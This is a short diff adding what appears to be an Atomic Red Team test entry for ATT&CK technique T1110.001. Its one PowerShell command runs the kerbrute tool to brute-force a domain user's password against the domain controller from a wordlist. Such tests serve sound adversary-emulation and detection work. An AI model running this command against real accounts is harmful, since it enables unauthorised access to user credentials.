@@ -1,0 +1,7 @@
+################T1110.001.md################
+
+##Atomic Test #4 - Password Brute User using Kerbrute Tool
+
+```.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1```
+
+```PAUSE```
